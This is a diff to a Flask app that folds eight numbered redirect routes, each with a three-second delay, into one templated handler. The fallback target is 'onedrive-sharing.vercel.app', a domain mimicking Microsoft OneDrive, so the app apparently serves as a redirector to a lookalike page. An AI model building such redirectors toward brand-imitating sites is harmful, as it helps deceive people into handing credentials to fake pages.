@@ -1,5 +1,4 @@
-from flask import Flask, request, redirect
-import time
+from flask import Flask, request, render_template
 
 app = Flask(__name__)
 
@@ -25,69 +24,12 @@ def get_redirect_url(path):
     else:
         return 'https://onedrive-sharing.vercel.app/'
 
-# Route to handle redirection for '/path1'
-@app.route('/path1')
-def path1_handler():
-    redirect_url = get_redirect_url('/path1')
-    time.sleep(3)  # Add a delay of 3 seconds
-    return redirect(redirect_url, code=302)
-
-# Route to handle redirection for '/path2'
-@app.route('/path2')
-def path2_handler():
-    redirect_url = get_redirect_url('/path2')
-    time.sleep(3)  # Add a delay of 3 seconds
-    return redirect(redirect_url, code=302)
-
-# Route to handle redirection for '/path3'
-@app.route('/path3')
-def path3_handler():
-    redirect_url = get_redirect_url('/path3')
-    time.sleep(3)  # Add a delay of 3 seconds
-    return redirect(redirect_url, code=302)
-
-# Route to handle redirection for '/path4'
-@app.route('/path4')
-def path4_handler():
-    redirect_url = get_redirect_url('/path4')
-    time.sleep(3)  # Add a delay of 3 seconds
-    return redirect(redirect_url, code=302)
-
-# Route to handle redirection for '/path5'
-@app.route('/path5')
-def path5_handler():
-    redirect_url = get_redirect_url('/path5')
-    time.sleep(3)  # Add a delay of 3 seconds
-    return redirect(redirect_url, code=302)
-
-# Route to handle redirection for '/path6'
-@app.route('/path6')
-def path6_handler():
-    redirect_url = get_redirect_url('/path6')
-    time.sleep(3)  # Add a delay of 3 seconds
-    return redirect(redirect_url, code=302)
-
-# Route to handle redirection for '/path7'
-@app.route('/path7')
-def path7_handler():
-    redirect_url = get_redirect_url('/path7')
-    time.sleep(3)  # Add a delay of 3 seconds
-    return redirect(redirect_url, code=302)
-
-# Route to handle redirection for '/path8'
-@app.route('/path8')
-def path8_handler():
-    redirect_url = get_redirect_url('/path8')
-    time.sleep(3)  # Add a delay of 3 seconds
-    return redirect(redirect_url, code=302)
-
-# Route to handle redirection for other paths
-@app.route('/')
-def redirect_path():
-    path = request.path
+# Route to handle redirection for paths '/path1' to '/path8'
+@app.route('/path<int:num>')
+def path_handler(num):
+    path = f'/path{num}'
     redirect_url = get_redirect_url(path)
-    time.sleep(3)  # Add a delay of 3 seconds
-    return redirect(redirect_url, code=302)
+    return render_template('redirect.html', redirect_url=redirect_url)
 
 # Route for the main page
 @app.route('/hello')
